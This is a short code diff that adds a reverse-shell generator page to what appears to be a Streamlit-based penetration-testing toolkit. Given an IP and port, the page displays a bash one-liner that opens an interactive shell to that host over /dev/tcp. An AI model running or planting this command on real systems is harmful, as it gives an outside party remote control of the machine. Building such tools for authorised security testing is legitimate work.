@@ -1,6 +1,10 @@
 import streamlit as st
-class ReverseShellModule:
+from modules.base import BaseModule, ModuleRegistry
+class ReverseShellModule(BaseModule):
+    def __init__(self):
+        super().__init__("Reverse Shell","reverse_shell"); ModuleRegistry.register(self)
     def render(self):
         st.header("Reverse Shell")
-        st.write("No implementation")
-# Not registered for simplicity
+        ip=st.text_input("IP","127.0.0.1"); p=st.text_input("Port","9001")
+        st.code(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1")
+ReverseShellModule()
